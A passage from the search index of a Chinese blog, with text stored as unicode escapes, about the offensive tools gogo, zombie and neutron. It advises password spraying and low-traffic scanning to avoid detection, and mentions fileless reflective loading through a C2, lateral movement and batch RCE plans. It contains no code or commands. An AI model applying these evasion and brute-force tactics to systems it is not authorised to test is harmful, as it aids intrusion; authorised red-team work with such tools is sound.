\u7136\u540e\u518d\u901a\u8fc7\u4ee3\u7406\u6216\u8005\u4e0a\u4f20zombie\u672c\u4f53\u8fdb\u884c\u7206\u7834.</p> <p>\u8fd9\u4e5f\u662f\u53d8\u76f8\u9f13\u52b1\u4f7f\u7528\u8005\u4e0d\u8981\u5728\u5185\u7f51\u8fdb\u884c\u5927\u89c4\u6a21\u7684\u670d\u52a1\u5f31\u53e3\u4ee4\u7206\u7834, \u5927\u591a\u6570\u5382\u5546\u7684\u6d41\u91cf\u8bbe\u5907\u5bf9\u670d\u52a1\u5f31\u53e3\u4ee4\u7206\u7834\u662f\u5f88\u654f\u611f\u7684, \u5927\u591a\u6570\u90fd\u662f\u4e25\u91cd\u6216\u8005\u9ad8\u5371\u7684\u544a\u8b66. gogo\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u53ea\u8fdb\u884c\u9ad8\u901f\u7387\u7684http\u53d1\u5305, \u4e0d\u4f1a\u53d1\u9001poc, \u7ecf\u5e38\u4f1a\u88ab\u5176\u4ed6\u544a\u8b66\u6df9\u6ca1\u800c\u5ffd\u7565\u4e86gogo\u7684\u626b\u63cf\u884c\u4e3a. \u5b9e\u9645\u4f7f\u7528\u4f53\u9a8c \u56e0\u4e3a\u9ad8\u901f\u7387\u53d1\u5305\u800c\u88ab\u53d1\u73b0\u7684\u60c5\u51b5\u8f83\u5c11.</p> <p>\u901a\u8fc7gogo\u7684\u7b5b\u9009\u529f\u80fd\u4e0ezombie\u7684\u81ea\u5b9a\u4e49\u529f\u80fd, \u53ef\u4ee5\u5bf9\u60f3\u8981\u7206\u7834\u7684\u5bc6\u7801\u672c\u4e0e\u76ee\u6807\u8fdb\u884c\u7cbe\u51c6\u7ba1\u63a7, \u5c3d\u91cf\u51cf\u5c11\u4e0d\u5fc5\u8981\u7684\u53d1\u5305\u4ee5\u89c4\u907f\u6d41\u91cf\u8bbe\u5907\u7684\u68c0\u6d4b. \u5982\u679c\u6709\u53ef\u80fd, \u6700\u597d\u53ea\u8fdb\u884c\u5bc6\u7801\u55b7\u6d12, \u800c\u975e\u7206\u7834.</p> <p>\u5728\u6211\u4eec\u7684\u89c4\u5212\u4e2d, zombie\u80fd\u505a\u7684\u4e0d\u4ec5\u4ec5\u662f\u53e3\u4ee4\u7684\u7206\u7834, \u8fd8\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e9b\u81ea\u52a8\u5316\u7684\u5229\u7528, \u6bd4\u5982mysql\u7206\u7834\u4e4b\u540e, \u5224\u65ad\u4e0b\u662f\u5426\u662froot, \u6709\u591a\u5c11\u6570\u636e, \u81ea\u5b9a\u4e49\u7684\u547d\u4ee4\u6279\u91cf\u6267\u884c\u7b49\u7b49\u529f\u80fd. \u6279\u91cf\u7684rce\u66f4\u4e0d\u662f\u68a6, \u53ea\u4e0d\u8fc7\u56e0\u4e3a\u5de5\u4f5c\u91cf\u95ee\u9898, \u8fd9\u90e8\u5206\u53ea\u80fd\u4e00\u5c0f\u5757\u4e00\u5c0f\u5757\u7684\u5b9e\u73b0, \u76ee\u524d\u7684zombie\u5df2\u7ecf\u652f\u6301\u4e86\u5341\u51e0\u79cd\u534f\u8bae, \u80fd\u8986\u76d6\u523090%\u4ee5\u4e0a\u7684hw\u4f7f\u7528\u573a\u666f. \u8ba9\u62a4\u7f51\u4e0d\u518d\u662f\u4e00\u4e2a\u4e00\u4e2a\u767b\u5f55\u4e0a\u53bb\u622a\u56fe, \u800c\u662fgogo\u4e0ezombie\u7684\u5feb\u4e50\u8054\u52a8, \u5185\u7f51\u5237\u5206, \u4e00\u884c\u547d\u4ee4!</p> <p>\u53ef\u4ee5\u53d1\u73b0gogo\u4e0ezombie\u7684\u573a\u666f\u4e5f\u4e0d\u5b8c\u5168\u4e00\u81f4, zombie\u5b8c\u5168\u53ef\u4ee5\u653e\u5728\u5916\u7f51, \u901a\u8fc7\u4ee3\u7406\u63a5\u5165, \u51cf\u8f7bzombie\u5f15\u5165\u5927\u91cf\u5e93\u7684\u514d\u6740\u538b\u529b.</p> <p>\u5728\u672a\u6765, \u6211\u6253\u7b97\u7f16\u5199\u4e00\u4e2agui\u754c\u9762\u7684\u7ed3\u679c\u89e3\u6790\u5668\u4e0e\u8054\u52a8\u5de5\u5177, \u4e5f\u53ef\u4ee5\u662f\u4e0ec2 webshell\u7684\u8054\u52a8, \u8fdb\u4e00\u6b65\u7b80\u5316\u64cd\u4f5c, \u8ba9gogo\u4e0ezombie\u7684\u8054\u52a8\u65e0\u7f1d\u8854\u63a5.</p>"},{"location":"blog/2022/11/15/gogo-introduce/#gogo\u7684\u672a\u6765\u5c55\u671b","title":"gogo\u7684\u672a\u6765\u5c55\u671b","text":"<ol> <li>\u96c6\u6210\u5230\u81ea\u52a8\u5316\u5916\u7f51\u4fe1\u606f\u6536\u96c6\u5de5\u5177, \u4e0e\u56fe\u6570\u636e\u5e93\u76f8\u7ed3\u5408 (\u5df2\u7ecf\u505a\u4e86\u4e00\u90e8\u5206)</li> <li>\u81ea\u52a8\u6536\u96c6\u7ed3\u679c, \u4ee5\u53ef\u89c6\u5316\u62a5\u544a\u7684\u5f62\u5f0f\u5448\u73b0 (\u5df2\u7ecf\u505a\u4e86\u4e00\u90e8\u5206)</li> <li>\u4e0ewebshell, c2\u5de5\u5177\u8054\u52a8, \u5b9e\u73b0\u56fe\u5f62\u5316 \u4e00\u952e\u4f7f\u7528 (\u5df2\u7ecf\u505a\u4e86\u4e00\u90e8\u5206)</li> <li>\u4e0emaitai(\u6682\u672a\u516c\u5f00\u7684\u4ee3\u7406\u5de5\u5177)\u8054\u52a8, \u5b9e\u73b0gogo\u6d41\u91cf\u7684\u9ad8\u6027\u80fd\u8f6c\u53d1.</li> <li>\u5185\u7f51\u5206\u5e03\u5f0f\u90e8\u7f72, \u591a\u70b9\u540c\u65f6\u626b\u63cf</li> <li>agent\u5316, \u7279\u6b8a\u7f51\u7edc\u73af\u5883\u4e0b, \u53ef\u4ee5\u53ea\u4e0a\u4f20tiny agent (\u901a\u8fc7maitai\u5b9e\u73b0, todo)</li> </ol>"},{"location":"blog/2022/11/15/gogo-introduce/#\u5176\u4ed6","title":"\u5176\u4ed6","text":"<p>gogo\u6700\u6838\u5fc3\u7684\u51e0\u5757\u529f\u80fd\u5c31\u662f\u6211\u521a\u624d\u63d0\u5230\u7684, \u4f46\u5b9e\u9645\u4e0a\u8fd8\u6709\u4e0d\u5c11\u7ec6\u8282\u6211\u6ca1\u6709\u4e00\u4e00\u4ecb\u7ecd, \u4f7f\u7528\u8005\u53ef\u4ee5\u5728\u5b9e\u6218\u4e2d\u6162\u6162\u4f53\u4f1a, \u6216\u8005\u9605\u8bfb\u4ed3\u5e93\u4e2d\u7684\u8bbe\u8ba1\u6587\u6863(\u4e0d\u8fc7\u5199\u5f97\u4e0d\u592a\u597d, \u4f1a\u6162\u6162\u6574\u7406\u4fee\u6539), \u4e5f\u6b22\u8fce\u63d0\u51fa\u65b0\u7684\u9700\u6c42\u4ee5\u53capr.</p> <p>\u5177\u4f53\u7684\u4f7f\u7528\u8bf7\u770bREADME.md \u4e0e--help.</p> <p>gogo\u662f\u6574\u4e2a\u8ba1\u5212\u7248\u56fe\u4e2d\u53d1\u5e03\u7684\u7b2c\u4e00\u5757\u62fc\u56fe, \u4e5f\u662f\u76ee\u524d\u6700\u6210\u719f\u7684\u90e8\u5206. \u795d\u5404\u4f4d\u7528\u7684\u5f00\u5fc3!</p> <p>\u5176\u4ed6\u5de5\u4ef6\u4f1a\u5728\u6574\u7406\u5b8c\u6210\u540e\u9010\u6b65\u5f00\u653e.</p> <p>\u5982\u679c\u6709\u4e0d\u6e05\u6670\u7684\u6587\u6863\u4e0e\u7528\u6cd5, \u6b22\u8fce\u5728issue\u4e2d\u63d0\u51fa, \u6211\u770b\u5230\u540e\u4f1a\u53ca\u65f6\u56de\u590d.</p> <p>\u5728\u6700\u8fd1\u5bf9\u8bb8\u591a\u6a21\u5757\u8fdb\u884c\u4e86\u8c03\u6574\u4e0e\u91cd\u6784, \u4e00\u4e9b\u539f\u672c\u6b63\u5e38\u7684\u529f\u80fd, \u4e5f\u8bb8\u4f1a\u56e0\u4e3a\u4e0d\u5145\u5206\u7684\u6d4b\u8bd5\u51fa\u73b0bug, \u5982\u679c\u51fa\u73b0\u4e0e\u9884\u671f\u4e0d\u7b26\u7684\u7ed3\u679c, \u8bf7\u63d0\u4ea4issue, \u6211\u4eec\u4f1a\u9a6c\u4e0a\u5904\u7406.</p> <p></p> <p>(\u9ad8\u7ea7\u8bf4\u6cd5, \u9762\u5411\u672a\u6765\u7f16\u7a0b. \u4f4e\u7ea7\u8bf4\u6cd5, \u753b\u997c)</p>"},{"location":"blog/2024/10/30/neutron-introduce/","title":"\u8d85\u8f7b\u91cf\u7684nuclei\u5f15\u64ce  neutron","text":""},{"location":"blog/2024/10/30/neutron-introduce/#\u80cc\u666f","title":"\u80cc\u666f","text":"<p>\u5728projectdiscovery\u878d\u7b2c\u4e00\u8f6e\u524d, \u6211\u5c31\u53d1\u73b0\u4e86\u8fd9\u4e2a\u5145\u6ee1\u672a\u6765\u7684\u9879\u76eenuclei.  </p> <p>nuclei\u63d0\u4f9b\u4e86\u6781\u7b80\u7684poc\u914d\u7f6e, \u5f3a\u5927\u7684DSL\u5f15\u64ce\u4ee5\u53ca\u76ee\u524d**\u5730\u8868\u6700\u5e9e\u5927\u7684poc\u793e\u533a**, \u6700\u91cd\u8981\u7684\u662f, \u5b83\u662f\u5b8c\u5168\u5f00\u6e90\u7684.</p> <p>\u968f\u7740nuclei \u66f4\u65b0\u5230v3, \u4e5f\u9762\u4e34\u4e86\u5de5\u5177\u8fdb\u5316\u8def\u4e0a\u5fc5\u5b9a\u4f1a\u7ecf\u8fc7\u7684\"\u8f6f\u4ef6\u81a8\u80c0\", nuclei\u4ecev1\u5230v3 \u5f15\u5165\u4e86\u975e\u5e38\u7684\u5e9e\u5927\u7684\u529f\u80fd</p> <ul> <li>js/python\u4f5c\u4e3a \u00a0Internal DSL \u5f15\u64ce</li> <li>headless\u6d4f\u89c8\u5668</li> <li>file, dns, offline,websoket,ssl,whois\u7b49\u65b0\u7684\u534f\u8bae\u5f15\u64ce</li> <li>OAST Out-of-band\u670d\u52a1</li> <li>...</li> </ul> <p>\u4e5f\u5f15\u5165\u4e86\u66f4\u591a\u7684bug, nuclei-templates\u7684\u5df2\u7ecf\u6709\u4e00\u90e8\u5206\u7684poc\u968f\u7740\u5f15\u64ce\u66f4\u65b0\u51fa\u73b0\u4e86bug. </p> <p>\u800cnuclei\u7684\u7edd\u5927\u6570poc, \u90fd\u7528\u4e0d\u7740\u8fd9\u4e9b\u529f\u80fd, \u5176\u4e2d\u6700\u5e38\u7528\u7684\u534f\u8bae\u662fhttp\u4e0esocket, \u6700\u5e38\u7528\u7684\u529f\u80fd\u662f\u901a\u8fc7yaml\u914d\u7f6e\u4e00\u4e2a\u6216\u8005\u51e0\u4e2a\u6570\u636e\u5305, \u7136\u540e\u6821\u9a8c\u8fd4\u56de\u503c. \u751a\u81f3OAST\u90fd\u4e0d\u662f\u5fc5\u5907\u7684\u529f\u80fd, \u56e0\u4e3a\u6781\u5c11\u6f0f\u6d1e\u5f3a\u4f9d\u8d56\u8fd9\u4e2a\u529f\u80fd, \u90fd\u80fd\u627e\u5230\u65f6\u5ef6, \u56de\u663e\u7b49\u65b9\u5f0f\u66f4\u9ad8\u6548\u4e0e\u51c6\u786e\u7684\u5224\u65ad.</p>"},{"location":"blog/2024/10/30/neutron-introduce/#internal-dsl","title":"Internal DSL","text":"<p>\u540d\u8bcd\u89e3\u91ca: \u5185\u90e8DSL\u662f\u5d4c\u5165\u5728\u5bbf\u4e3b\u8bed\u8a00\u4e2d\u7684\u9886\u57df\u7279\u5b9a\u8bed\u8a00\u3002\u5b83\u5229\u7528\u5bbf\u4e3b\u8bed\u8a00\u7684\u8bed\u6cd5\u3001\u8bed\u4e49\u548c\u5e93\u6765\u521b\u5efa\u4e00\u4e2a\u7279\u6b8a\u7684\u8bed\u6cd5\uff0c\u4f9b\u7279\u5b9a\u9886\u57df\u7684\u4efb\u52a1\u4f7f\u7528\u3002</p> <p>projectdiscovery\u7684nuclei, \u6700\u521d\u901a\u8fc7\u57fa\u4e8eyaml\u7684DSL(\u00a0Domain Specific Language \u7279\u5b9a\u9886\u57df\u8bed\u8a00), \u5b9e\u73b0poc\u7684\u89c4\u8303\u5316. \u5728\u65b0\u7684\u5927\u7248\u672cnuclei v3\u66f4\u662f\u63d0\u4f9b\u4e86<code>Internal DSL</code> \u5d4c\u5165\u4e86python, javascript\u4f5c\u4e3aGPL(General-Purpose Language \u4e00\u822c\u7528\u9014\u8bed\u8a00). </p> <p>\u987a\u4fbf\u4e00\u63d0, nuclei\u5230v3, \u8bc4\u4ef7\u6709\u4e9b\u5f00\u59cb\u4e24\u7ea7\u5206\u5316\u4e86. nuclei\u671d\u7740\u901a\u7528\u626b\u63cf\u5668(\u7c7b\u4f3cAWVS)\u524d\u8fdb, \u4f46\u662f\u6700\u5f00\u59cb\u4f7f\u7528nuclei\u7684\u7528\u6237\u770b\u91cd\u7684\u662f\u5176\u8f7b\u91cf\u5316, \u7a33\u5b9a, \u53ef\u63a7, \u53ef\u62d3\u5c55. \u8fc7\u5ea6\u7684\u529f\u80fd\u81a8\u80c0\u4e0d\u6b62\u5e26\u6765\u4e86\u975e\u5e38\u591a\u7684bug(nuclei\u975e\u5e38\u591a\u7684poc\u5df2\u7ecf\u65e0\u6cd5\u6b63\u5e38\u8fd0\u884c), \u4e5f\u5e26\u6765\u4e86\u4f53\u79ef\u4e0a\u5347, \u6027\u80fd\u4e0b\u964d, debug\u56f0\u96be\u7b49\u95ee\u9898.  \u66fe\u7ecf\u4e3a\u4e86\u6ee1\u8db3gogo\u5728windows xp\u4e2d\u4f7f\u7528, \u7f16\u5199\u7684\u8f7b\u91cfnuclei-templates\u5f15\u64ce nuetron \u73b0\u5728\u517c\u5bb9\u4e86nuclei v2.* 90%\u4ee5\u4e0a\u7684\u529f\u80fd, \u5e76\u4e14\u4e0d\u4f1a\u5e26\u6765\u5927\u91cf\u4f9d\u8d56, \u4e0d\u4f1a\u7834\u574f\u539f\u6709\u7684\u517c\u5bb9\u6027, \u53ef\u4ee5\u5728\u4efb\u610f\u4ee3\u7801\u4e2d\u5feb\u901f\u5d4c\u5165\u5e76\u89e3\u6790\u8fd0\u884c nuclei\u7684templates-yaml.</p> <p>IDSL\u7684\u4f18\u70b9\u975e\u5e38\u591a, \u9002\u5408AI\u751f\u6210, \u4f7f\u7528\u7b80\u5355, \u4e0a\u624b\u95e8\u69db\u4f4e. \u800c\u7f3a\u70b9\u4e5f\u663e\u800c\u6613\u89c1, IDSL\u901a\u5e38\u53ea\u80fd\u6ee1\u8db3\u8f83\u5c0f\u7684\u7279\u5b9a\u9886\u57df, \u4f8b\u5982\u63cf\u8ff0\u4e00\u4e2a\u6f0f\u6d1e\u7684POC\u5982\u4f55\u5b9e\u73b0, \u4f46\u662f\u5bf9\u4e8e\u66f4\u52a0\u590d\u6742\u7684\u573a\u666f\u4f1a\u663e\u5f97\u6349\u895f\u89c1\u8098, \u5904\u5904\u9650\u5236.</p> <p>\u4f8b\u5982nuclei\u5c1d\u8bd5\u652f\u6301\u901a\u7528\u6f0f\u6d1e(\u4f8b\u5982SQL\u6ce8\u5165, XSS), \u66fe\u7ecf\u53eb fuzzing-templates, \u73b0\u5728\u662ftemplates\u4ed3\u5e93\u4e0b\u7684dast .</p> <p>\u76f4\u5230\u73b0\u5728\u4e5f\u53ea\u662f\u5c0f\u732b\u4e09\u4e24\u53ea, \u539f\u56e0\u5c31\u5728\u4e8eIDSL\u7684\u8868\u8fbe\u529b\u662f\u4e0d\u5982EDSL\u66f4\u4e0d\u5982GPL\u7684, \u5982\u679c\u901a\u8fc7\u5185\u5d4c\u7684python,javascript\u5b9e\u73b0, \u53c8\u4f1a\u5931\u53bbDSL\u7684\u539f\u672c\u7684\u4f18\u52bf. </p> <p> \u6211\u731c\u8fd9\u4e5f\u662fnuclei\u5728v3\u7248\u672c\u5f15\u5165javascript/python\u7b49GPL\u4f5c\u4e3a\u5176DSL\u7684\u62d3\u5c55\u7684\u539f\u56e0\u3002\u4e0d\u63d0\u9ad8\u81ea\u5df1\u7684\u57fa\u7840\u80fd\u529b\u5c31\u6ca1\u529e\u6cd5\u8986\u76d6\u590d\u6742\u573a\u666f\u3002\u4f46\u4e5f\u56e0\u4e3anuclei\u53d8\u5f97\u590d\u6742\uff0cchainreactors\u4e2d\u7684gogo/zombie\u4e24\u4e2a\u5de5\u5177\u4e0d\u5f97\u4e0d\u653e\u5f03\u539f\u7248\u7684nuclei\uff0c\u81ea\u884c\u5b9e\u73b0\u4e86\u8f7b\u91cf\u7ea7\u7684poc\u5f15\u64ce neutron</p>"},{"location":"blog/2024/10/30/neutron-introduce/#external-dsl","title":"External DSL","text":"<p>\u540d\u8bcd\u89e3\u91ca: \u5916\u90e8DSL\u662f\u4e00\u79cd\u72ec\u7acb\u7684\u9886\u57df\u7279\u5b9a\u8bed\u8a00\uff0c\u5b83\u6709\u81ea\u5df1\u7684\u8bed\u6cd5\u548c\u8bed\u4e49\uff0c\u901a\u5e38\u9700\u8981\u4e00\u4e2a\u4e13\u95e8\u7684\u89e3\u6790\u5668\u6216\u7f16\u8bd1\u5668\u6765\u5904\u7406</p> <p>\u8fd9\u4e2a\u6280\u672f\u8def\u7ebf\u5728\u5b89\u5168\u9886\u57df\u7684\u4f8b\u5b50\u5c31\u662f\u8fd1\u4e24\u5e74\u706b\u70ed\u7684 yaklang \u4ee5\u53ca\u5bf9\u5e94\u7684yakit.  yakit\u65e9\u671f\u5e94\u8be5\u662f\u57fa\u4e8egolang\u7684\u89e3\u91ca\u5668\u5b9e\u73b0\u7684(\u6211\u4e0d\u662f\u7279\u522b\u4e86\u89e3, \u6b22\u8fce\u7ea0\u6b63), \u73b0\u5728\u5219\u662f\u8fd0\u884c\u5728\u81ea\u5df1\u5b9e\u73b0\u7684\u865a\u62df\u673a\u4e0a, \u9010\u6e10\u671d\u7740GPL\u53d1\u5c55. </p> <p>yaklang\u4ece\u6700\u521d\u7684\u517c\u5bb9golang\u7684\u751f\u6001, \u5230\u73b0\u5728\u80fd\u5c06\u4e0d\u540c\u8bed\u8a00/DSL\u7f16\u8bd1\u5230\u81ea\u5df1\u7684VM\u4e0a\u4ee5\u517c\u5bb9\u7f51\u7edc\u5b89\u5168\u9886\u57df\u4e94\u82b1\u516b\u95e8\u7684\u751f\u6001. \u4ed6\u4eec\u7684\u6280\u672f\u8def\u7ebf\u51e0\u4e4e\u662f\u7f51\u7edc\u5b89\u5168\u9886\u57df\u5b9e\u73b0DSL\u7684\u6700\u4f73\u5b9e\u8df5.</p> <p>\u8981\u8bf4\u7f3a\u70b9\uff0c\u4e5f\u548cnuclei v3\u9047\u5230\u7684\u95ee\u9898\u6709\u70b9\u7c7b\u4f3c\uff0c\u8fd9\u6837\u7684\u8bbe\u8ba1\u80fd\u7528\u5728\u4e2a\u4eba\u7684\u673a\u5668\u4e0a\uff0c\u4f46\u662f\u8981\u57fa\u4e8e\u6b64\u4e00\u5957\u5206\u5e03\u5f0f\u6216\u8005\u5185\u7f51\u7279\u5316\u7684\u5de5\u5177\u5f0f\u8fd8\u662f\u8fc7\u4e8e\u7b28\u91cd\u4e86\u3002</p>"},{"location":"blog/2024/10/30/neutron-introduce/#\u5d4c\u5165nuclei","title":"\u5d4c\u5165nuclei","text":"<p>\u4f46\u5bf9\u4e8enuclei\u7684\u521d\u8877---poc\u5f15\u64ce\u6765\u8bf4, \u786e\u5b9e\u62d3\u5c55\u4e86\u5f15\u64ce\u7684\u80fd\u529b\u8fb9\u754c, \u4e5f\u610f\u5473\u7740\u5f88\u96be\u5c06nuclei\u5d4c\u5165\u5230\u5404\u79cd\u573a\u666f\u4e2d, \u4e0d\u7ba1\u4ec0\u4e48\u5de5\u5177\u5f15\u5165\u4e86nuclei, \u4f53\u79ef\u90fd\u8981\u98d9\u5347\u523030-50M. \u538b\u7f29\u5b8c\u4f53\u79ef\u4e5f\u8d85\u8fc7\u4e8610M.</p> <p>\u66f4\u91cd\u8981\u7684\u662f, nuclei\u8fd8\u4f1a\u7834\u574f\u64cd\u4f5c\u7cfb\u7edf\u7684\u517c\u5bb9\u6027, nuclei v2\u80fd\u652f\u6301\u5230windows7, v3 \u5e94\u8be5\u53ea\u80fd\u5728win10\u4ee5\u4e0a\u8fd0\u884c\u4e86(go 1.11 \u653e\u5f03\u5bf9xp\u652f\u6301, go1.18\u653e\u5f03\u5bf9windows7\u652f\u6301). \u5bf9\u4e8e\u7edd\u5927\u591a\u6570\u4f7f\u7528\u8005\u6765\u8bf4\u8fd9\u6ca1\u6709\u5f71\u54cd, \u5404\u4f4d\u90fd\u6709\u6700\u597d\u914d\u7f6e\u7684\u7535\u8111. \u4f46\u5728\u7ea2\u84dd\u5bf9\u6297\u4e2d, \u6211\u4eec\u6ca1\u529e\u6cd5\u63a7\u5236\u6211\u4eec\u7684\u7acb\u8db3\u70b9, \u8fd9\u70b9\u5c31\u663e\u5f97\u5c24\u4e3a\u91cd\u8981. </p> <p>github\u4e0a\u80fd\u627e\u5230\u5341\u6765\u4e2a\u5f15\u7528\u4e86\"github.com/projectdiscovery/nuclei\" \u7684\u5de5\u5177, \u4f53\u79ef\u4e5f\u662f\u4e00\u4e2a\u6bd4\u4e00\u4e2a\u5e9e\u5927\u4eceupx\u5b8c\u768410+M\u5230\u4e0a\u767eM, \u5f88\u96be\u60f3\u8c61\u4f7f\u7528\u8fd9\u6837\u7684\u5de5\u5177\u5728\u7ea2\u84dd\u5bf9\u6297\u4e2d\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8.  </p> <p>\u5728\u8fd9\u91cc, \u6211\u53ef\u4ee5\u5f88\u81ea\u8c6a\u5f97\u8bf4, \u5728\u6781\u9650\u573a\u666f(upx+\u653e\u5f03\u5c11\u6570\u51e0\u4e2adsl\u51fd\u6570)\u7684gogo\u53ef\u4ee5\u505a\u5230\u4fdd\u7559\u5b8c\u6574\u529f\u80fd\u4f53\u79ef\u57282M\u4ee5\u4e0b(\u73b0\u5728github release\u4e0a\u7684\u4f53\u79ef\u4e5f\u53ea\u67093M), \u53ea\u6bd4golang\u9ed8\u8ba4\u914d\u7f6e\u4e0b\u7f16\u8bd1\u51fa\u6765\u7684helloworld\u592730%. </p> <p>\u90a3\u8fd9\u4e2a\u4f53\u79ef\u80fd\u505a\u4ec0\u4e48\u5462? \u7ed9C2\u53cd\u5c04\u52a0\u8f7d!!! \u6211\u4eec\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4e0d\u843d\u5730\u7684gogo.  (\u73b0\u5728\u7684\u5f88\u591a\u6280\u672f\u4e5f\u53ef\u4ee5\u52a0\u8f7d\u4e0d\u9650\u5236\u4f53\u79ef\u7684pe\u6587\u4ef6, \u4f46\u5728\u5404\u65b9\u9762\u7279\u5f81\u4e0a, \u603b\u662f\u8d8a\u5c0f\u8d8a\u597d)</p> <p>(\u6b22\u8fce\u4f53\u9a8c\u6211\u4eec\u7684\u65b0\u5de5\u5177 \u4e0b\u4e00\u4ee3C2IoM , \u5df2\u7ecf\u652f\u6301\u4e86chainreactor\u7684\u5de5\u5177)</p> <p></p>"},{"location":"blog/2024/10/30/neutron-introduce/#\u5b9e\u73b0","title":"\u5b9e\u73b0","text":"<p>\u521a\u624d\u63d0\u5230gogo\u53ea\u67092-3M, \u90a3\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e2a\u7279\u6027, \u5c31\u4e0d\u53ef\u80fd\u5f15\u7528\u5b8c\u6574\u7684nuclei\u5f15\u64ce. </p> <p>\u5728gogo\u6700\u521d\u63a5\u5165poc\u5f15\u64ce\u65f6, nuclei\u5927\u7ea6\u662fv2.7\u7248\u672c, \u4e8e\u662f\u51b3\u5b9a\u4ecenuclei\u4e2d\u628a\u9700\u8981\u7684\u4ee3\u7801\u62a0\u51fa\u6765, \u5c01\u88c5\u62100\u4f9d\u8d56\u7684\u5e93.  \u4e0d\u5f97\u4e0d\u8bf4, nuclei\u4ee3\u7801\u8d28\u91cf\u5df2\u7ecf\u975e\u5e38\u4e0d\u9519, \u4f46\u8fd9\u9879\u5de5\u4f5c\u8fd8\u662f\u8017\u8d39\u4e86\u5f88\u5927\u7684\u7cbe\u529b. \u597d\u5728\u7ed3\u679c\u4e5f\u503c\u5f97\u8fd9\u6837\u7684\u6295\u5165.</p> <p>gogo\u5728public\u7b2c\u4e00\u4e2a\u7248\u672c\u4e4b\u524d, \u5c31\u5df2\u7ecf\u652f\u6301\u4e86nuclei v2.7\u7684\u5927\u90e8\u5206\u5e38\u7528\u7279\u6027, \u7279\u522b\u662f\u5176yaml\u5f15\u64ce. \u53ea\u6709OAST, DSL(\u5df2\u5728\u65b0\u7248\u672c\u4e2d\u652f\u6301)\u8fd9\u4e24\u4e2a\u76f8\u5bf9\u6709\u7528\u7684\u529f\u80fd\u6ca1\u6709\u5b9e\u73b0, \u5176\u4ed6\u7279\u5b9a\u5747\u80fd\u5b8c\u7f8e\u8fd0\u884c\u5728\u65e0\u4f9d\u8d56\u7684nano\u7248\u672c\u5f15\u64ce\u4e2d. </p> <p>\u8fd9\u6b63\u56e0\u5982\u6b64, \u5c06\u5176\u547d\u540d\u4e3a neutron (\u4e2d\u5b50).  \u8fd9\u6700\u521d\u662f\u7ed9gogo\u4f7f\u7528\u7684nano\u7248\u672c\u7684poc\u5f15\u64ce.</p> <p>\u673a\u7f18\u5de7\u5408\u4e4b\u4e0b, \u6709\u4e0d\u5c11\u76f8\u540c\u9700\u6c42\u7684\u670b\u53cb\u770b\u5230\u4e86\u8fd9\u4e2a\u9879\u76ee, \u5e76\u5c1d\u8bd5\u5c06\u5176\u7528\u5230\u81ea\u5df1\u7684\u5de5\u5177\u4e2d.  </p> <p>\u4e8e\u662fneutron\u5f00\u59cb\u518d\u6b21\u8fdb\u5316. </p> <p>gogo\u7684\u4f7f\u7528\u573a\u666f\u8f83\u4e3a\u6781\u7aef, \u56e0\u6b64\u5bf9nuclei\u9609\u5272\u7684\u65f6\u5019\u4e0b\u624b\u592a\u91cd, \u6709\u5f88\u591a\u5f88\u5e38\u7528\u7684\u529f\u80fd\u4ee5\u53cav2.7\u540e\u51fa\u73b0\u7684\u529f\u80fd\u90fd\u4e0d\u652f\u6301. \u4f46\u4ed6\u4eec\u7684\u573a\u666f\u8986\u76d6\u7684\u8303\u56f4\u66f4\u5e7f, \u6709\u5728\u5916\u7f51\u4f7f\u7528\u7684, \u7528\u5728\u96c6\u6210\u5316\u7684\u626b\u63cf\u5668\u4f7f\u7528\u7684, \u4ed6\u4eec\u9700\u8981\u4e00\u4e2a\u76f8\u5bf9\u5b8c\u6574\u7684nuclei. \u800c\u6211\u4e5f\u89c9\u5f97, gogo\u76ee\u524d\u7684poc\u5e93\u652f\u6301\u7684poc\u8fc7\u4e8e\u5c11, \u4e5f\u65e0\u66f4\u591a\u7cbe\u529b\u53bb\u7ef4\u62a4poc\u5e93.  \u6211\u60f3\u8981\u80fd\u4ecenuclei-templates\u4e2d\u76f4\u63a5\u79fb\u690d, \u800c\u4e0d\u9700\u8981\u8fc7\u591a\u6539\u52a8, \u5c3d\u53ef\u80fd\u51cf\u5c11\u79fb\u690d\u6210\u672c. </p> <p>neutron\u5c31\u5728\u4eca\u5e74\u7684\u65e9\u4e9b\u65f6\u5019\u8fdb\u884c\u4e86\u5927\u91cf\u66f4\u65b0, \u5c06\u5404\u79cd\u7279\u6027\u517c\u5bb9\u5230v2\u7684\u6700\u540e\u4e00\u4e2a\u7248\u672c, \u5e76\u4e14\u91cd\u65b0\u652f\u6301\u4e86dsl(\u6709\u592a\u591apoc\u4e2d\u5305\u542b\u4e86\u8fd9\u4e2a\u529f\u80fd). \u66f4\u91cd\u8981\u7684\u662f, \u8fd9\u4e9b\u63d0\u5347\u5e76\u6ca1\u6709\u5e26\u6765\u517c\u5bb9\u6027\u7684\u635f\u5931, gogo\u8fd8\u662f\u53ef\u4ee5\u5728windowsxp\u4e2d\u5b8c\u7f8e\u8fd0\u884c, \u4e5f\u662f\u76ee\u524d\u5e02\u9762\u4e0a, \u9ad8\u6027\u80fd\u7684\u626b\u63cf\u4e2d, \u552f\u4e00\u652f\u6301windows xp\u7684\u5de5\u5177. </p> <p>\u53ef\u4ee5\u5728\u8fd9\u91cc\u770b\u5230\u66f4\u65b0\u65e5\u5fd7: https://chainreactors.github.io/wiki/libs/neutron/update/</p> <p>\u76ee\u524d\u552f\u4e00\u7684\u9057\u61be\u53ef\u80fd\u662f, \u4f9d\u65e7\u4e0d\u652f\u6301OAST, \u53ef\u80fd\u672a\u6765\u4e5f\u4e0d\u4f1a\u652f\u6301\u8fd9\u4e2a\u529f\u80fd. \u56e0\u4e3a\u5bf9\u4e8e\u6211\u4eec\u5173\u5fc3\u7684\u573a\u666f\u6765\u8bf4, \u9700\u8981\u7528\u5230OOB\u672c\u8eab\u5c31\u4ee3\u8868\u8fd9\u4e2apoc\u4e0d\u53ef\u9760. </p>"},{"location":"blog/2024/10/30/neutron-introduce/#\u65b0\u7528\u9014","title":"\u65b0\u7528\u9014","text":"<p>\u968f\u7740zombie\u9010\u6e10\u6210\u719f, \u652f\u6301\u4e86\u5e02\u9762\u4e0a\u5176\u4ed6\u540c\u7c7b\u578b\u5de5\u5177\u90fd\u652f\u6301\u7684\u534f\u8bae\u540e, \u7ee7\u7eed\u5411\u7740web\u9886\u57df\u6269\u5f20.  \u8fd9\u65f6\u5019\u53d1\u73b0neutron\u4e0ezombie\u662f\u7edd\u914d. 